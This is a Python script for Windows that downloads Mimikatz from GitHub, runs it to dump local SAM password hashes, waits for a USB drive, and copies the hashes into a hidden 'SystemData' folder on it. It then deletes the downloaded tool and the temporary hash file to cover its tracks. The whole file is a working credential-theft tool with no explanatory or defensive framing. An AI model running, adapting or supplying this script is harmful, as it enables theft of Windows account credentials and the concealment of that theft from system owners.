import os
import time
import ctypes
import urllib.request
import zipfile
import shutil

MIMIKATZ_URL = "https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918/mimikatz_trunk.zip"
MIMIKATZ_ZIP_PATH = "C:\\Windows\\Temp\\mimikatz.zip"
MIMIKATZ_DIR = "C:\\Windows\\Temp\\mimikatz"
HASH_OUTPUT = "C:\\Windows\\Temp\\hashes.txt"
USB_FOLDER = "\\SystemData\\hashes.txt"

# Function to download and unzip Mimikatz
def download_mimikatz():
    # Download Mimikatz
    urllib.request.urlretrieve(MIMIKATZ_URL, MIMIKATZ_ZIP_PATH)
    
    # Unzip Mimikatz
    with zipfile.ZipFile(MIMIKATZ_ZIP_PATH, 'r') as zip_ref:
        zip_ref.extractall(MIMIKATZ_DIR)

# Function to dump Windows password hashes using Mimikatz
def dump_hashes():
    mimikatz_exe = os.path.join(MIMIKATZ_DIR, "x64", "mimikatz.exe")
    if not os.path.exists(mimikatz_exe):
        print("Mimikatz not found. Aborting!")
        return
    
    # Run Mimikatz to dump password hashes
    os.system(f'{mimikatz_exe} "privilege::debug" "lsadump::sam" exit > {HASH_OUTPUT}')

# Function to find the USB drive
def find_usb_drive():
    drives = []
    bitmask = ctypes.windll.kernel32.GetLogicalDrives()
    for letter in 'ABCDEFGHIJKLMNOPQRSTUVWXYZ':
        if bitmask & 1:
            drive_type = ctypes.windll.kernel32.GetDriveTypeW(f"{letter}:\\")
            if drive_type == 2:  # DRIVE_REMOVABLE
                drives.append(f"{letter}:\\")
        bitmask >>= 1
    return drives

# Function to store the hashes in a hidden folder on the USB drive
def store_hashes_on_usb(usb_drive):
    hidden_dir = os.path.join(usb_drive, "SystemData")
    os.makedirs(hidden_dir, exist_ok=True)
    
    # Set the directory to hidden
    ctypes.windll.kernel32.SetFileAttributesW(hidden_dir, 0x02)  # FILE_ATTRIBUTE_HIDDEN
    
    # Move the hash file to the USB drive
    shutil.copy(HASH_OUTPUT, os.path.join(hidden_dir, "hashes.txt"))
    print(f"Hashes copied to: {os.path.join(hidden_dir, 'hashes.txt')}")

# Main function
def main():
    # Download and run Mimikatz to dump the password hashes
    download_mimikatz()
    dump_hashes()

    # Check for USB drive
    while True:
        usb_drives = find_usb_drive()
        if usb_drives:
            for usb in usb_drives:
                print(f"USB drive detected: {usb}")
                store_hashes_on_usb(usb)
            break
        else:
            print("No USB drive detected, waiting...")
            time.sleep(5)  # Check every 5 seconds

    # Cleanup
    if os.path.exists(HASH_OUTPUT):
        os.remove(HASH_OUTPUT)
    if os.path.exists(MIMIKATZ_ZIP_PATH):
        os.remove(MIMIKATZ_ZIP_PATH)
    if os.path.exists(MIMIKATZ_DIR):
        shutil.rmtree(MIMIKATZ_DIR)

if __name__ == "__main__":
    main()
